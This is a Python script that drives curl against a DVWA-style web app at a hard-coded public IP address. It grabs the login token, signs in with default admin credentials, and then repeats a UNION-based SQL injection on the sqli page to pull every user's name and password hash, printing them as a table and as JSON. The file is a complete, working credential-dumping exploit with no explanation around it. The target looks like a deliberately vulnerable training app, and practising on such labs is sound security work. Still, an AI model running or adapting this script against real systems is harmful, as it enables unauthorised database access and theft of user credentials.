
import subprocess
import re
from html import unescape

# Step 1: Get login page and extract token
cmd = [
    'curl',
    '-s',
    '-c', '/tmp/cookies.txt',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", result.stdout)
token = token_match.group(1) if token_match else None
print(f"[*] Token: {token}")

# Step 2: Login
cmd = [
    'curl',
    '-s',
    '-b', '/tmp/cookies.txt',
    '-c', '/tmp/cookies.txt',
    '-d', f'username=admin&password=password&user_token={token}&Login=Login',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
print("[*] Logged in successfully")

# Step 3: Extract all users one by one
print("\n[*] Extracting all users from database...\n")

users_list = []

# First, let's get all user IDs
for user_id in range(1, 20):  # Try up to 20 users
    test_id = f"999' UNION SELECT user, password FROM users WHERE user_id={user_id}-- -"
    
    cmd = [
        'curl',
        '-s',
        '-b', '/tmp/cookies.txt',
        '-d', f'id={test_id}&Submit=Submit',
        'http://31.97.117.123/vulnerabilities/sqli/'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    
    # Look for pre section
    if '<pre>' in result.stdout:
        start = result.stdout.find('<pre>')
        end = result.stdout.find('</pre>', start) + 6
        section = result.stdout[start:end]
        
        # Extract the content between <pre> tags
        content = section.replace('<pre>', '').replace('</pre>', '').strip()
        
        # Look for user data format: ID: <payload><br />First name: <username><br />Surname: <password>
        match = re.search(r'First name: (.*?)<br />Surname: (.*?)(?:<br|$)', content)
        if match:
            username = match.group(1).strip()
            password_hash = match.group(2).strip()
            
            # Only add if we got valid data (not the original query)
            if username and password_hash and 'UNION' not in username:
                users_list.append({
                    'user_id': user_id,
                    'username': username,
                    'password_hash': password_hash
                })
                print(f"[+] Found: ID={user_id}, Username={username}, Hash={password_hash}")

if users_list:
    print("\n" + "="*80)
    print("[+] ALL EXTRACTED USERS:")
    print("="*80)
    print(f"\n{'ID':<5} {'Username':<15} {'Password Hash':<35}")
    print("-" * 60)
    for user in users_list:
        print(f"{user['user_id']:<5} {user['username']:<15} {user['password_hash']:<35}")
    
    print("\n[+] Full user data:")
    import json
    print(json.dumps(users_list, indent=2))

